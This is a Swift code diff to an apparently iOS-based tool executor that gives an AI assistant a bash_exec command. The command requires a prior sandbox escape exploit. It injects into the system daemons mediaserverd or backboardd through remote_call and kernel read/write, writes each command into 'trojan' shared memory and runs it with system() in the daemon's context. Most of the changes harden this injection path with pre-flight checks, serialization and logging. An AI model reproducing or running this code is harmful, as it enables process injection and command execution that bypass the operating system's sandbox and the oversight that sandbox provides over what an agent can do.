@@ -5,6 +5,9 @@ final class FileToolsExecutor {
 
     private let writeBlocklist = ["/System/Library/CoreServices", "/usr/lib", "/bin", "/sbin"]
 
+    /// Serial queue to prevent concurrent access to non-thread-safe remote_call globals.
+    private static let remoteCallQueue = DispatchQueue(label: "com.claudefiles.remotecall")
+
     func execute(name: String, input: [String: AnyJSON]) async -> String {
         let path      = input["path"]?.string      ?? ""
         let content   = input["content"]?.string   ?? ""
@@ -221,48 +224,88 @@ final class FileToolsExecutor {
             return "Error: blocked dangerous command"
         }
 
+        // NSLog flushes immediately — DebugLog may not flush before a C-level crash
+        NSLog("[bashExec] START command: %@", String(command.prefix(100)))
         DebugLog.log("bashExec: \(command.prefix(100))")
 
         // Check sandbox escape — required for remote_call
         let escaped = await MainActor.run { SandboxManager.shared.status.isUsable }
         guard escaped else {
+            NSLog("[bashExec] ABORT: sandbox escape not active")
             return "Error: sandbox escape required for bash_exec. Run the exploit first."
         }
+        NSLog("[bashExec] Sandbox escape confirmed")
 
-        // Use remote_call via mediaserverd (safe — launchd respawns it if it crashes).
-        // Strategy: write command to trojan mem, call system() in mediaserverd's context,
-        // redirect output to a temp file, then read the temp file back.
+        // Pre-flight: verify target process exists before calling init_remote_call
+        // (init_remote_call does proc_find_by_name via kernel r/w — if that returns 0
+        //  and the code reads from near-zero address, we get a hard crash)
+        let targetProcess: String
+        if let _ = findPid(byName: "mediaserverd") {
+            targetProcess = "mediaserverd"
+            NSLog("[bashExec] Pre-flight: mediaserverd found via sysctl")
+        } else if let _ = findPid(byName: "backboardd") {
+            targetProcess = "backboardd"
+            NSLog("[bashExec] Pre-flight: mediaserverd NOT found, backboardd found via sysctl")
+        } else {
+            NSLog("[bashExec] ABORT: neither mediaserverd nor backboardd found in process list")
+            return "Error: target daemon not running. Neither mediaserverd nor backboardd found in process list."
+        }
+
         let tmpOut = "/tmp/.claude_cmd_\(ProcessInfo.processInfo.processIdentifier)"
 
         return await withCheckedContinuation { (cont: CheckedContinuation<String, Never>) in
-            // Use a reference-type wrapper so closures and the helper method
-            // can safely share the "resume once" guard across threads.
             let once = OnceResume(cont)
 
-            // Timeout
-            DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 20) {
-                once.resume("Error: bash_exec timed out after 20s")
+            // Timeout — 30s to allow serial queue wait + execution
+            DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 30) {
+                NSLog("[bashExec] TIMEOUT after 30s")
+                once.resume("Error: bash_exec timed out after 30s")
             }
 
-            DispatchQueue.global(qos: .userInitiated).async { [self] in
-                DebugLog.log("[bashExec] Attaching to mediaserverd…")
-                let initRet = init_remote_call("mediaserverd", true)
+            // Serialize all remote_call access — the C globals are NOT thread-safe
+            FileToolsExecutor.remoteCallQueue.async { [self] in
+                NSLog("[bashExec] Acquired serial queue, attaching to %@…", targetProcess)
+
+                let initRet = init_remote_call(targetProcess, true)
+                NSLog("[bashExec] init_remote_call(%@) returned: %d", targetProcess, initRet)
+
                 guard initRet == 0 else {
-                    DebugLog.log("[bashExec] init_remote_call(mediaserverd) failed: \(initRet)")
-                    // Fallback: try backboardd
-                    DebugLog.log("[bashExec] Trying backboardd…")
-                    let initRet2 = init_remote_call("backboardd", true)
-                    guard initRet2 == 0 else {
-                        DebugLog.log("[bashExec] init_remote_call(backboardd) also failed: \(initRet2)")
-                        once.resume("Error: could not attach to any system daemon for command execution (mediaserverd=\(initRet), backboardd=\(initRet2)). Is sandbox escape active?")
+                    // Try fallback only if primary was mediaserverd
+                    if targetProcess == "mediaserverd" {
+                        NSLog("[bashExec] Trying backboardd as fallback…")
+                        let initRet2 = init_remote_call("backboardd", true)
+                        NSLog("[bashExec] init_remote_call(backboardd) returned: %d", initRet2)
+                        guard initRet2 == 0 else {
+                            once.resume("Error: could not attach to any system daemon (mediaserverd=\(initRet), backboardd=\(initRet2)). Is sandbox escape active?")
+                            return
+                        }
+                        defer { destroy_remote_call() }
+
+                        // Verify trojan memory was allocated
+                        let trojanAddr = g_RC_trojanMem
+                        NSLog("[bashExec] g_RC_trojanMem (backboardd) = 0x%llx", trojanAddr)
+                        guard trojanAddr != 0 else {
+                            once.resume("Error: remote trojan memory not allocated (backboardd). init succeeded but shared memory is null.")
+                            return
+                        }
+
+                        self.executeViaRemoteCall(command: command, tmpOut: tmpOut, once: once)
                         return
                     }
-                    // Continue with backboardd
-                    defer { destroy_remote_call() }
-                    self.executeViaRemoteCall(command: command, tmpOut: tmpOut, once: once)
+                    once.resume("Error: init_remote_call(\(targetProcess)) failed with code \(initRet). Is sandbox escape active?")
                     return
                 }
+
                 defer { destroy_remote_call() }
+
+                // Verify trojan memory was actually allocated before writing to it
+                let trojanAddr = g_RC_trojanMem
+                NSLog("[bashExec] g_RC_trojanMem = 0x%llx", trojanAddr)
+                guard trojanAddr != 0 else {
+                    once.resume("Error: remote trojan memory not allocated. init_remote_call succeeded but shared memory is null.")
+                    return
+                }
+
                 self.executeViaRemoteCall(command: command, tmpOut: tmpOut, once: once)
             }
         }
@@ -290,18 +333,23 @@ final class FileToolsExecutor {
         // Build the shell command that redirects output to our temp file
         let wrappedCmd = "(\(command)) > \(tmpOut) 2>&1; echo $? >> \(tmpOut)"
 
+        NSLog("[bashExec] Writing command to trojan mem at 0x%llx (%d bytes)…",
+              g_RC_trojanMem, wrappedCmd.utf8.count)
+
         // Write command string to trojan shared memory page
         guard remote_writeStr(g_RC_trojanMem, wrappedCmd) else {
+            NSLog("[bashExec] remote_writeStr FAILED")
             once.resume("Error: failed to write command to remote process memory")
             return
         }
 
-        DebugLog.log("[bashExec] Calling system() in remote process…")
+        NSLog("[bashExec] remote_writeStr succeeded, calling system() via do_remote_call_stable…")
 
         // Call system(g_RC_trojanMem) — system() is in libSystem and available everywhere
         let result = do_remote_call_stable(10000, "system",
                                             g_RC_trojanMem, 0, 0, 0, 0, 0, 0, 0)
 
+        NSLog("[bashExec] system() returned: %llu", result)
         DebugLog.log("[bashExec] system() returned: \(result)")
 
         // Small delay to let output file finish writing
